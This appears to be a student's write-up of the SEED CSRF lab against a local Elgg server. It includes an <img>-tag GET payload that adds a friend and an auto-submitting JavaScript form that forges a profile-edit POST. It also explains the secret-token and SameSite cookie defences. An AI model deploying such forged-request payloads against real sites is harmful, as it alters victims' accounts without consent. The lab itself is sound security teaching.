# Cross-Site Request Forgery (CSRF) Attack Lab
- a CSRF attack involves a victim user, a trusted site, and a malicious site, the victim user holds an active session with a trusted site while visiting a malicious site. The malicious site injects an HTTP request for the trusted site into the victim user session, causing damages
- web application used: `Elgg`
- topics
    - CSRF attack
    - CSRF countermeasures: Secret token and Same-site cookie
    - JavaScript and Ajax

## Lab Setup
- the Elgg container (`10.9.0.5 www.seed-server.com`)
- the attacker container (`10.9.0.105 www.attacker32.com`)
- DNS configuration
    ```
    10.9.0.5 www.seed-server.com
    10.9.0.5 www.example32.com
    10.9.0.105 www.attacker32.com
    ```

## Task 1: Observing HTTP Request
- use HTTP Header Live on Firefox

## Task 2: CSRF Attack using GET Request
- use Alice's and Samy's account, use CSRF to make Alice add Samy to her Elgg friend list
- login as Samy, add Charlie as friend, use HTTP Header Live to see the request
    - URL (duplicated parameters are removed) `http://www.seed-server.com/action/friends/add?friend=58&__elgg_ts=1707056081&__elgg_token=-RraUFTlunG52v081kwsbw`
- requirement: not use JS code, the attack should succeed as soon as Alice visits the page
- `__elgg_ts` and `__elgg_token` are actually used to defeat CSRF, in this lab, they are disabled
- so, the link to add Samy to friend list is `http://www.seed-server.com/action/friends/add?friend=59`, `59` is the id of Samy, we can figure this out by use another account to add Samy and inspect the request URL
- when Alice clicks a link from Samy, she visits `www.attacker32.com`, to trigger a GET request to Elgg, use an image tag `<img>` in `www.attacker32.com`, add the following content to `Labsetup/attacker/addfriend.html`
    - `<img src="http://www.seed-server.com/action/friends/add?friend=59" />`
- when Alice logged into Elgg, and visits `www.attacker32.com/addfriend.html`, it triggers a GET request to Elgg, and add Samy to Alice's friend list

## Task 3: CSRF Attack using POST Request
- use CSRF to edit Alice's profile to `Samy is my Hero`
- inspect the HTTP request when clicking save on the profile edit page, it is a POST request, the data in request body is `name=Samy$description=<p>123456</p>&guid=59` (I removed some parameters that is not used), the URL is `http://seed-server.com/samy/edit`
- by adding Alice to friend list, we can get Alice's guid from the request URL, its 56, so we need to construct a POST request with data `name=Alice$description=<p>Samy is my Hero</p>&guid=56`, and the URL should be `http://seed-server.com/action/profile/edit`
- we can set these values in the given `editprofile.html`, in this file it modifies `Brief description`, instead of `About Me`
    ```
    <script type="text/javascript">
    function forge_post() {
        var fields;

        fields += "<input type='hidden' name='name' value='Alice'>";
        fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero'>";
        fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
        fields += "<input type='hidden' name='guid' value='56'>";

        var p = document.createElement("form");
        p.action = "http://www.seed-server.com/action/profile/edit";
        p.innerHTML = fields;
        p.method = "post";

        document.body.appendChild(p);
        p.submit();
    }
    window.onload = function() { forge_post();}
    </script>
    ```

- Question: what if we want to modify the profile of all users who visits the malicious site
    - we need to dynamically get the name and guid of the victims
    - use `<iframe src="http://www.seed-server.com">` to load Elgg inside the attacker's site, if we success, we can put the script inside the iframe, and use `elgg.session.user.name` and `elgg.session.user.guid` to get user name and guid
    - however, the Elgg website cannot be loaded in the iframe, the error information is `"To protect your security, www.seed-server.com will not allow Firefox to display the page if another site has embedded it. To see this page, you need to open it in a new window"`, there might be a countermeasure implemented in the Elgg application

## Defense
- Initially, most applications put a secret token in their page, and by checking whether the token is present in the request or not, they can tell whether a request is a same-site request or a cross-site request, this is called `secret token` approach. More recently, most browsers have implemented a mechanism called `SameSite cookie`, which is intended to simplify the implementation of CSRF countermeasures

## Task 4: Enabling Elgg's Countermeasures
- web applications can embed a secret token in their pages, and all requests coming from these pages must carry this token, or they will be considered as a cross-site request, and will not have the same privilege as the same-site requests. Attacker will not be able to get this token, so their requests can be identified as cross-site requests
- in Elgg, `__elgg_token` is the secret tokens, `__elgg_ts` is a timestamp, they will be validated before processing a request
    ```
    <input type="hidden" name="__elgg_ts" value="" />
    <input type="hidden" name="__elgg_token" value="" />
    ```
    ```
    $ts = time();
    $token = elgg()->csrf->generateActionToken($ts);
    echo elgg_view('input/hidden', ['name' => '__elgg_token', 'value' => $token]);
    echo elgg_view('input/hidden', ['name' => '__elgg_ts', 'value' => $ts]);
    ```
- Elgg's security token is a md5 message digest of the site secret value (retrieved from database), timestamp, user session ID and random generated session string, the code for secret token generation in Elgg:
    ```
    public function generateActionToken($timestamp, $session_token='') {
        if(!$session_token) {
            $session_token = $this->session->get('__elgg_session');
            if(!$session_token) {
                return false;
            }
        }
        return $this->hmac
                    ->getHmac([(int) $timestamp, $session_token], 'md5')
                    ->getToken();
    }
    ```
- secret token validation: generate a md5 digest for `__elgg_ts` in the request and the session id, compare it to the `__elgg_token` in the request. Besides, check the `__elgg_ts`, ensure the token is not expired (default timeout is `2` hours)

- enable this countermeasure, and login as Alice, then visit the attacker's website, we can get an error information: "Form is missing __token or __ts fields"
    - add these 2 fields in the attacker's page, and put some random value, the attack cannot succeed, because the request cannot pass the validation
    - if we go to Alice's profile in Elgg, inspect the page elements and find the value of `__elgg_ts` and `__elgg_token`, put them into the attacker's page, then visit this page, the attack can succeed
    - in a real attack, the attacker cannot get these value, because the token is calculated from Alice's session id with a timestamp, and will only be put in the page when logging in as Alice, when visiting the attacker's page, the attacker cannot know the value of the token, and the corresponding timestamp. However, if the attacker can put a iframe (to load the Elgg's page) in the malicious page, and run a script inside, the script can get the value of `__elgg_ts` and `__elgg_token` inside the iframe, this is disabled by Elgg application, as mentioned in Task `3`

## Task 5: Experimenting with the SameSite Cookie Method
- most browsers have implemented a mechanism called SameSite cookie
- when sending out requests, browsers will check this property, and decide whether to attach the cookie in a cross-site request, a web application can set a cookie as SameSite if it does not want the cookie to be attched to cross-site requests. For example, they can mark the session ID cookie as SameSite, so no cross-site request can use the session ID, and will therefore not be able to launch CSRF attacks
- visit `10.9.0.5 www.example32.com`, 3 cookies will be set, `cookie-normal`, `cookie-lax`, and `cookie-strict`, there are 2 links on this page, link A points to a test page on `www.example32.com`, while link B points to a test page on `www.attacker32.com`, in each test page, we can send a GET or POST request back to `www.example32.com`, and we can see which cookie will be sent by the browser
    - link A
        - GET: `cookie-normal`, `cookie-lax`, `cookie-strict`
        - POST: `cookie-normal`, `cookie-lax`, `cookie-strict`
    - link B
        - GET: `cookie-normal`, `cookie-lax`
        - POST: `cookie-normal`
- conclusion: for SameCookie, there are 2 types, `Lax` and `Strict`. Cross-site request will not carry `Strict` cookies. Cross-site POST request will not carry `Lax` cookies, but cross-site GET request can carry `Lax` cookies
- in a CSRF attack, the victim visits the attacker's site, and triggers a request to the Elgg website, if the session ID cookie is marked as SameSite cookie, if it is `Strict`, the session id cookie will not be sent by the browser, and the request won't pass the validation
